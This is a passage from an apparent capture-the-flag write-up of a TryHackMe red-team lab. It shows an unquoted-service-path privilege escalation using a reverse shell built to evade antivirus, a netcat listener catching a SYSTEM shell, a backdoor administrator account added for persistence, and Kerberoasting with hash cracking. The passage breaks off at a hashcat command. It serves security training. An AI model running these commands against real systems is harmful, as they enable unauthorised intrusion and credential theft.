</span></pre></table></code></div></div><h3 id="privilege-escalation"><strong>Privilege Escalation</strong></h3><p>I found an interesting folder Called <strong>“Backup Service”</strong> in the root directory of <code class="language-plaintext highlighter-rouge">C:</code> that had another folder inside of it called “Full Backup” that had an executable file in it called <code class="language-plaintext highlighter-rouge">backup.exe</code>.</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">ls</span><span class="w">
</span><span class="n">Mode</span><span class="w">                </span><span class="nx">LastWriteTime</span><span class="w">         </span><span class="nx">Length</span><span class="w"> </span><span class="nx">Name</span><span class="w">
</span><span class="o">----</span><span class="w">                </span><span class="o">-------------</span><span class="w">         </span><span class="o">------</span><span class="w"> </span><span class="o">----</span><span class="w">
</span><span class="n">d-----</span><span class="w">        </span><span class="nx">7/12/2024</span><span class="w">  </span><span class="nx">12:30</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Backup</span><span class="w"> </span><span class="nx">Service</span><span class="w">
</span><span class="n">d-----</span><span class="w">       </span><span class="nx">11/14/2018</span><span class="w">   </span><span class="nx">6:56</span><span class="w"> </span><span class="nx">AM</span><span class="w">                </span><span class="nx">EFI</span><span class="w">
</span><span class="n">d-----</span><span class="w">        </span><span class="nx">5/13/2020</span><span class="w">   </span><span class="nx">5:58</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">PerfLogs</span><span class="w">
</span><span class="n">d-r---</span><span class="w">        </span><span class="nx">3/18/2023</span><span class="w">  </span><span class="nx">10:45</span><span class="w"> </span><span class="nx">AM</span><span class="w">                </span><span class="nx">Program</span><span class="w"> </span><span class="nx">Files</span><span class="w">
</span><span class="n">d-----</span><span class="w">        </span><span class="nx">3/18/2023</span><span class="w">  </span><span class="nx">10:44</span><span class="w"> </span><span class="nx">AM</span><span class="w">                </span><span class="nx">Program</span><span class="w"> </span><span class="nx">Files</span><span class="w"> </span><span class="p">(</span><span class="n">x86</span><span class="p">)</span><span class="w">
</span><span class="n">d-----</span><span class="w">        </span><span class="nx">2/19/2023</span><span class="w">   </span><span class="nx">5:06</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Python311</span><span class="w">
</span><span class="n">d-r---</span><span class="w">        </span><span class="nx">7/12/2024</span><span class="w">  </span><span class="nx">12:45</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Users</span><span class="w">
</span><span class="n">d-----</span><span class="w">        </span><span class="nx">4/15/2023</span><span class="w">   </span><span class="nx">7:56</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Windows</span><span class="w">
</span><span class="nt">-a</span><span class="o">----</span><span class="w">        </span><span class="mi">4</span><span class="n">/15/2023</span><span class="w">   </span><span class="nx">6:25</span><span class="w"> </span><span class="nx">PM</span><span class="w">        </span><span class="nx">3162859</span><span class="w"> </span><span class="nx">EC2-Windows-Launch.zip</span><span class="w">
</span><span class="nt">-a</span><span class="o">----</span><span class="w">        </span><span class="mi">4</span><span class="n">/15/2023</span><span class="w">   </span><span class="nx">6:25</span><span class="w"> </span><span class="nx">PM</span><span class="w">          </span><span class="nx">13182</span><span class="w"> </span><span class="nx">install.ps1</span><span class="w">
</span><span class="nt">-a</span><span class="o">----</span><span class="w">        </span><span class="mi">4</span><span class="n">/27/2023</span><span class="w">   </span><span class="nx">8:00</span><span class="w"> </span><span class="nx">AM</span><span class="w">            </span><span class="nx">848</span><span class="w"> </span><span class="nx">thm-network-setup.ps1</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cd</span><span class="w"> </span><span class="s1">'.\Backup Service\'</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Backup</span><span class="w"> </span><span class="nx">Service</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">ls</span><span class="w">
</span><span class="n">Directory:</span><span class="w"> </span><span class="nx">C:\Backup</span><span class="w"> </span><span class="nx">Service</span><span class="w">
</span><span class="n">Mode</span><span class="w">                </span><span class="nx">LastWriteTime</span><span class="w">         </span><span class="nx">Length</span><span class="w"> </span><span class="nx">Name</span><span class="w">
</span><span class="o">----</span><span class="w">                </span><span class="o">-------------</span><span class="w">         </span><span class="o">------</span><span class="w"> </span><span class="o">----</span><span class="w">
</span><span class="n">d-----</span><span class="w">        </span><span class="nx">2/14/2023</span><span class="w">   </span><span class="nx">7:34</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Full</span><span class="w"> </span><span class="nx">Backup</span><span class="w">

</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Backup</span><span class="w"> </span><span class="nx">Service</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cd</span><span class="w"> </span><span class="s1">'.\Full Backup\'</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Backup</span><span class="w"> </span><span class="nx">Service\Full</span><span class="w"> </span><span class="nx">Backup</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">ls</span><span class="w">

    </span><span class="n">Directory:</span><span class="w"> </span><span class="nx">C:\Backup</span><span class="w"> </span><span class="nx">Service\Full</span><span class="w"> </span><span class="nx">Backup</span><span class="w">

</span><span class="n">Mode</span><span class="w">                </span><span class="nx">LastWriteTime</span><span class="w">         </span><span class="nx">Length</span><span class="w"> </span><span class="nx">Name</span><span class="w">
</span><span class="o">----</span><span class="w">                </span><span class="o">-------------</span><span class="w">         </span><span class="o">------</span><span class="w"> </span><span class="o">----</span><span class="w">
</span><span class="nt">-a</span><span class="o">----</span><span class="w">        </span><span class="mi">2</span><span class="n">/14/2023</span><span class="w">   </span><span class="nx">7:34</span><span class="w"> </span><span class="nx">PM</span><span class="w">              </span><span class="nx">0</span><span class="w"> </span><span class="nx">backup.exe</span><span class="w">
</span></pre></table></code></div></div><p>The Back Service Folder is a bit catchy as it is not created by default. So this might be a scheduled task that creates this file regularly, or a service. Let’s check.</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="c"># Schedule Task</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Backup</span><span class="w"> </span><span class="nx">Service\Full</span><span class="w"> </span><span class="nx">Backup</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">get-scheduledtask</span><span class="w"> </span><span class="nt">-taskname</span><span class="w"> </span><span class="s1">'*backup*'</span><span class="w">

</span><span class="n">TaskPath</span><span class="w">                                       </span><span class="nx">TaskName</span><span class="w">                          </span><span class="nx">State</span><span class="w">
</span><span class="o">--------</span><span class="w">                                       </span><span class="o">--------</span><span class="w">                          </span><span class="o">-----</span><span class="w">
</span><span class="n">\Microsoft\Windows\Registry\</span><span class="w">                   </span><span class="nx">RegIdleBackup</span><span class="w">                     </span><span class="nx">Ready</span><span class="w">
</span><span class="c"># Service</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Backup</span><span class="w"> </span><span class="nx">Service\Full</span><span class="w"> </span><span class="nx">Backup</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-Service</span><span class="w"> </span><span class="nt">-ServiceName</span><span class="w"> </span><span class="s1">'backup'</span><span class="w">

</span><span class="n">Status</span><span class="w">   </span><span class="nx">Name</span><span class="w">               </span><span class="nx">DisplayName</span><span class="w">
</span><span class="o">------</span><span class="w">   </span><span class="o">----</span><span class="w">               </span><span class="o">-----------</span><span class="w">
</span><span class="n">Stopped</span><span class="w">  </span><span class="nx">Backup</span><span class="w">             </span><span class="nx">backup</span><span class="w">
</span></pre></table></code></div></div><p>It appears that this is a service, but it has been stopped. Let’s dig more to see if we can exploit it or not.</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Backup</span><span class="w"> </span><span class="nx">Service\Full</span><span class="w"> </span><span class="nx">Backup</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-WmiObject</span><span class="w"> </span><span class="nx">win32_Service</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-Object</span><span class="w"> </span><span class="nx">Name</span><span class="p">,</span><span class="w"> </span><span class="nx">State</span><span class="p">,</span><span class="w"> </span><span class="nx">Startmode</span><span class="p">,</span><span class="w"> </span><span class="nx">description</span><span class="p">,</span><span class="w"> </span><span class="nx">PathName</span><span class="p">,</span><span class="w"> </span><span class="nx">DisplayName</span><span class="p">,</span><span class="w"> </span><span class="nx">startname</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-String</span><span class="w"> </span><span class="nt">-Pattern</span><span class="w"> </span><span class="s1">'backup'</span><span class="w">
</span><span class="p">@{</span><span class="nx">Name</span><span class="o">=</span><span class="nx">Backup</span><span class="p">;</span><span class="w"> </span><span class="nx">State</span><span class="o">=</span><span class="nx">Stopped</span><span class="p">;</span><span class="w"> </span><span class="nx">Startmode</span><span class="o">=</span><span class="nx">Manual</span><span class="p">;</span><span class="w"> </span><span class="nx">description</span><span class="o">=</span><span class="p">;</span><span class="w"> </span><span class="nx">PathName</span><span class="o">=</span><span class="nx">C</span><span class="err">:\</span><span class="nx">Backup</span><span class="w"> </span><span class="nx">Service</span><span class="err">\</span><span class="nx">Full</span><span class="w"> </span><span class="nx">Backup</span><span class="err">\</span><span class="nx">backup</span><span class="err">.</span><span class="nx">exe</span><span class="p">;</span><span class="w"> </span><span class="nx">DisplayName</span><span class="o">=</span><span class="nx">Backup</span><span class="p">;</span><span class="w"> </span><span class="nx">startname</span><span class="o">=</span><span class="nx">LocalSystem</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>Here it is! This service is being executed with Local System permission, and it is vulnerable to unquoted service paths. So exploiting this service will grant us Local Admin access on the WRK1 machine. As the WRK1 machine has Windows Defender enabled, we need to find a shell that passes the AV. Let’s try this one: <a href="https://github.com/izenynn/c-reverse-shell">https://github.com/izenynn/c-reverse-shell</a></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nv">$ </span>./change_client.sh 12.100.1.x 9009                               
Done!                                                                                                 
<span class="nv">$ </span>i686-w64-mingw32-gcc-win32 <span class="nt">-std</span><span class="o">=</span>c99 windows.c <span class="nt">-o</span> rsh.exe <span class="nt">-lws2_32</span>                                                                                                 
<span class="nv">$ </span><span class="nb">cp </span>rsh.exe ~/THM/N-RedTeamCC<span class="se">\C</span>apstone_Challenge_Resources/Tools 
</pre></table></code></div></div><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cd</span><span class="w"> </span><span class="s1">'.\Backup Service\'</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Backup</span><span class="w"> </span><span class="nx">Service</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">ls</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Backup</span><span class="w"> </span><span class="nx">Service\</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cp</span><span class="w"> </span><span class="nx">\\tsclient\share\rsh.exe</span><span class="w"> </span><span class="nx">Full.exe</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Backup</span><span class="w"> </span><span class="nx">Service</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">net</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="nx">backup</span><span class="w">
</span><span class="n">The</span><span class="w"> </span><span class="nx">service</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">not</span><span class="w"> </span><span class="nx">responding</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">control</span><span class="w"> </span><span class="nx">function.</span><span class="w">
</span><span class="n">More</span><span class="w"> </span><span class="nx">help</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">available</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">typing</span><span class="w"> </span><span class="nx">NET</span><span class="w"> </span><span class="nx">HELPMSG</span><span class="w"> </span><span class="nx">2186.</span><span class="w">
</span></pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="nv">$ </span>rlwrap nc <span class="nt">-nvlp</span> 9009
listening on <span class="o">[</span>any] 9009 ...
connect to <span class="o">[</span>12.100.1.x] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.200.x.21] 63432
Microsoft Windows <span class="o">[</span>Version 10.0.17763.4252]
<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
<span class="nb">whoami
</span>nt authority<span class="se">\s</span>ystem

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;hostname
<span class="nb">hostname
</span>WRK1
</pre></table></code></div></div><p>Great!! we are now having local admin privliges on the WRK1 machine.</p><h3 id="persistence"><strong>Persistence</strong></h3><p>let’s do persistence and create our own privileged username.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;net user ItsFadinG <span class="s1">'hacker14!@'</span> /add
net user ItsFadinG <span class="s1">'hacker14!@'</span> /add
The <span class="nb">command </span>completed successfully.
C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;net localgroup Administrators ItsFadinG /add
net localgroup Administrators ItsFadinG /add
The <span class="nb">command </span>completed successfully.
C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;net localgroup <span class="s2">"Remote Desktop Users"</span> ItsFadinG /add
net localgroup <span class="s2">"Remote Desktop Users"</span> ItsFadinG /add
The <span class="nb">command </span>completed successfully.
</pre></table></code></div></div><p>We are now able to obtain the following flag:</p><ul><li><strong><em>Flag 4, Administrative access to Corporate Division Tier 2 Infrastructure</em></strong></ul><h2 id="corporate-division-tier-1-infrastructure"><strong>Corporate Division Tier 1 Infrastructure</strong></h2><h3 id="enumeration-1"><strong>Enumeration</strong></h3><p><strong>From WRK1 Machine</strong></p><p>We have achieved local administrator access on the WRK1 machine. However, to fully compromise the Active Directory, we need to obtain a Domain Admin account. I have dived deep into enumeration, and I couldn’t find something interesting except this service account.</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\mohammad.ahmed</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-DomainUser</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">svcOctober</span><span class="w">

</span><span class="n">logoncount</span><span class="w">            </span><span class="p">:</span><span class="w"> </span><span class="nx">14</span><span class="w">
</span><span class="n">badpasswordtime</span><span class="w">       </span><span class="p">:</span><span class="w"> </span><span class="nx">1/1/1601</span><span class="w"> </span><span class="nx">12:00:00</span><span class="w"> </span><span class="nx">AM</span><span class="w">
</span><span class="n">distinguishedname</span><span class="w">     </span><span class="p">:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">svcOctober</span><span class="p">,</span><span class="nx">OU</span><span class="o">=</span><span class="n">Services</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">corp</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">thereserve</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">loc</span><span class="w">
</span><span class="nx">objectclass</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="n">top</span><span class="p">,</span><span class="w"> </span><span class="nx">person</span><span class="p">,</span><span class="w"> </span><span class="nx">organizationalPerson</span><span class="p">,</span><span class="w"> </span><span class="nx">user</span><span class="p">}</span><span class="w">
</span><span class="n">displayname</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="nx">svcOctober</span><span class="w">
</span><span class="n">lastlogontimestamp</span><span class="w">    </span><span class="p">:</span><span class="w"> </span><span class="nx">3/24/2023</span><span class="w"> </span><span class="nx">8:54:16</span><span class="w"> </span><span class="nx">PM</span><span class="w">
</span><span class="n">userprincipalname</span><span class="w">     </span><span class="p">:</span><span class="w"> </span><span class="nx">svcOctober</span><span class="err">@</span><span class="nx">corp.thereserve.loc</span><span class="w">
</span><span class="n">name</span><span class="w">                  </span><span class="p">:</span><span class="w"> </span><span class="nx">svcOctober</span><span class="w">
</span><span class="n">objectsid</span><span class="w">             </span><span class="p">:</span><span class="w"> </span><span class="nx">S-1-5-21-170228521-1485475711-3199862024-1987</span><span class="w">
</span><span class="n">samaccountname</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="nx">svcOctober</span><span class="w">
</span><span class="n">codepage</span><span class="w">              </span><span class="p">:</span><span class="w"> </span><span class="nx">0</span><span class="w">
</span><span class="n">samaccounttype</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="nx">USER_OBJECT</span><span class="w">
</span><span class="n">accountexpires</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="nx">NEVER</span><span class="w">
</span><span class="n">countrycode</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="nx">0</span><span class="w">
</span><span class="n">whenchanged</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="nx">3/24/2023</span><span class="w"> </span><span class="nx">8:54:16</span><span class="w"> </span><span class="nx">PM</span><span class="w">
</span><span class="n">instancetype</span><span class="w">          </span><span class="p">:</span><span class="w"> </span><span class="nx">4</span><span class="w">
</span><span class="n">usncreated</span><span class="w">            </span><span class="p">:</span><span class="w"> </span><span class="nx">341698</span><span class="w">
</span><span class="n">objectguid</span><span class="w">            </span><span class="p">:</span><span class="w"> </span><span class="nx">11e69fd6-46e7-414b-9c42-3fa7dafe9275</span><span class="w">
</span><span class="n">lastlogoff</span><span class="w">            </span><span class="p">:</span><span class="w"> </span><span class="nx">1/1/1601</span><span class="w"> </span><span class="nx">12:00:00</span><span class="w"> </span><span class="nx">AM</span><span class="w">
</span><span class="n">objectcategory</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">Person</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="n">Schema</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="kr">Configuration</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">thereserve</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">loc</span><span class="w">
</span><span class="nx">dscorepropagationdata</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="mi">3</span><span class="n">/20/2023</span><span class="w"> </span><span class="nx">5:01:14</span><span class="w"> </span><span class="nx">PM</span><span class="p">,</span><span class="w"> </span><span class="nx">2/15/2023</span><span class="w"> </span><span class="nx">9:07:45</span><span class="w"> </span><span class="nx">AM</span><span class="p">,</span><span class="w"> </span><span class="nx">1/1/1601</span><span class="w"> </span><span class="nx">12:00:01</span><span class="w"> </span><span class="nx">AM</span><span class="p">}</span><span class="w">
</span><span class="n">serviceprincipalname</span><span class="w">  </span><span class="p">:</span><span class="w"> </span><span class="nx">mssql/svcOctober</span><span class="w">
</span><span class="n">givenname</span><span class="w">             </span><span class="p">:</span><span class="w"> </span><span class="nx">svcOctober</span><span class="w">
</span><span class="n">memberof</span><span class="w">              </span><span class="p">:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">Internet</span><span class="w"> </span><span class="nx">Access</span><span class="p">,</span><span class="nx">OU</span><span class="o">=</span><span class="n">Groups</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">corp</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">thereserve</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">loc</span><span class="w">
</span><span class="nx">lastlogon</span><span class="w">             </span><span class="p">:</span><span class="w"> </span><span class="nx">3/30/2023</span><span class="w"> </span><span class="nx">10:26:54</span><span class="w"> </span><span class="nx">PM</span><span class="w">
</span><span class="n">badpwdcount</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="nx">0</span><span class="w">
</span><span class="n">cn</span><span class="w">                    </span><span class="p">:</span><span class="w"> </span><span class="nx">svcOctober</span><span class="w">
</span><span class="n">useraccountcontrol</span><span class="w">    </span><span class="p">:</span><span class="w"> </span><span class="nx">NORMAL_ACCOUNT</span><span class="p">,</span><span class="w"> </span><span class="nx">DONT_EXPIRE_PASSWORD</span><span class="w">
</span><span class="n">whencreated</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="nx">2/15/2023</span><span class="w"> </span><span class="nx">9:07:45</span><span class="w"> </span><span class="nx">AM</span><span class="w">
</span><span class="n">primarygroupid</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="nx">513</span><span class="w">
</span><span class="n">pwdlastset</span><span class="w">            </span><span class="p">:</span><span class="w"> </span><span class="nx">2/15/2023</span><span class="w"> </span><span class="nx">9:07:45</span><span class="w"> </span><span class="nx">AM</span><span class="w">
</span><span class="n">usnchanged</span><span class="w">            </span><span class="p">:</span><span class="w"> </span><span class="nx">527762</span><span class="w">
</span></pre></table></code></div></div><p>Usually in any tryhackme ad room, if there are any service accounts, these accounts will be Kerberoastable and their passwords can be cracked. Let’s follow our intuition and see.</p><h3 id="kerbroasting"><strong>Kerbroasting</strong></h3><p><strong>Remotely</strong></p><p>I have tried this attack from my kali machine but it wasn’t working at all. and I wasn’t sure what was the reason.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-[~/THM/N-RedTeamCC]
└─<span class="nv">$ </span>python3 /usr/local/bin/GetUserSPNs.py corp.thereserve.loc/laura.wood:Password1@ <span class="nt">-dc-ip</span> 10.200.x.102 <span class="nt">-request</span>  
Impacket v0.10.1.dev1+20230223.202738.f4b848fa - Copyright 2022 Fortra

<span class="o">[</span>-] <span class="o">[</span>Errno 110] Connection timed out
</pre></table></code></div></div><p><strong>Locally</strong></p><p>Using the PowerShell script, <a href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1">Invoke-Kerberoast</a> from the <a href="https://github.com/EmpireProject/Empire">Empire</a> project, which can be loaded directly into memory:</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="c"># IK == Invoke-Kerberoast.ps1</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\mohammad.ahmed</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Import-Module</span><span class="w"> </span><span class="nx">\\tsclient\share\ik.ps1</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\mohammad.ahmed</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Invoke-Kerberoast</span><span class="w"> </span><span class="nt">-OutputFormat</span><span class="w"> </span><span class="nx">hashcat</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">Hash</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-File</span><span class="w"> </span><span class="nt">-Encoding</span><span class="w"> </span><span class="nx">ASCII</span><span class="w"> </span><span class="nx">hashes.kerberoast</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\mohammad.ahmed</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">dir</span><span class="w">
    </span><span class="n">Directory:</span><span class="w"> </span><span class="nx">C:\Users\mohammad.ahmed</span><span class="w">

</span><span class="n">Mode</span><span class="w">                </span><span class="nx">LastWriteTime</span><span class="w">         </span><span class="nx">Length</span><span class="w"> </span><span class="nx">Name</span><span class="w">
</span><span class="o">----</span><span class="w">                </span><span class="o">-------------</span><span class="w">         </span><span class="o">------</span><span class="w"> </span><span class="o">----</span><span class="w">
</span><span class="n">d-r---</span><span class="w">        </span><span class="nx">5/21/2024</span><span class="w">   </span><span class="nx">2:13</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">3D</span><span class="w"> </span><span class="nx">Objects</span><span class="w">
</span><span class="n">d-r---</span><span class="w">        </span><span class="nx">5/21/2024</span><span class="w">   </span><span class="nx">2:13</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Contacts</span><span class="w">
</span><span class="n">d-r---</span><span class="w">        </span><span class="nx">5/21/2024</span><span class="w">   </span><span class="nx">2:13</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Desktop</span><span class="w">
</span><span class="n">d-r---</span><span class="w">        </span><span class="nx">5/21/2024</span><span class="w">   </span><span class="nx">2:13</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Documents</span><span class="w">
</span><span class="n">d-r---</span><span class="w">        </span><span class="nx">5/21/2024</span><span class="w">   </span><span class="nx">2:13</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Downloads</span><span class="w">
</span><span class="n">d-r---</span><span class="w">        </span><span class="nx">5/21/2024</span><span class="w">   </span><span class="nx">2:13</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Favorites</span><span class="w">
</span><span class="n">d-r---</span><span class="w">        </span><span class="nx">5/21/2024</span><span class="w">   </span><span class="nx">2:13</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Links</span><span class="w">
</span><span class="n">d-r---</span><span class="w">        </span><span class="nx">5/21/2024</span><span class="w">   </span><span class="nx">2:13</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Music</span><span class="w">
</span><span class="n">d-r---</span><span class="w">        </span><span class="nx">5/21/2024</span><span class="w">   </span><span class="nx">2:13</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Pictures</span><span class="w">
</span><span class="n">d-r---</span><span class="w">        </span><span class="nx">5/21/2024</span><span class="w">   </span><span class="nx">2:13</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Saved</span><span class="w"> </span><span class="nx">Games</span><span class="w">
</span><span class="n">d-r---</span><span class="w">        </span><span class="nx">5/21/2024</span><span class="w">   </span><span class="nx">2:13</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Searches</span><span class="w">
</span><span class="n">d-r---</span><span class="w">        </span><span class="nx">5/21/2024</span><span class="w">   </span><span class="nx">2:13</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Videos</span><span class="w">
</span><span class="nt">-a</span><span class="o">----</span><span class="w">        </span><span class="mi">5</span><span class="n">/22/2024</span><span class="w">   </span><span class="nx">3:00</span><span class="w"> </span><span class="nx">PM</span><span class="w">          </span><span class="nx">12915</span><span class="w"> </span><span class="nx">hashes.kerberoast</span><span class="w">
</span></pre></table></code></div></div><p>And let’s try to crack those Kerberos tickets hashes with Hashcat. Unfortunately, only the <strong>svcScanning</strong> account has been cracked.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-[~/THM/N-RedTeamCC<span class="se">\H</span>ashes]
└─<span class="nv">$ </span>hashcat <span class="nt">-m</span> 13100 svcScanning.hash <span class="nt">--wordlist</span> ../Capstone_Challenge_Resources/generated_passwords2.txt <span class="nt">--show</span>
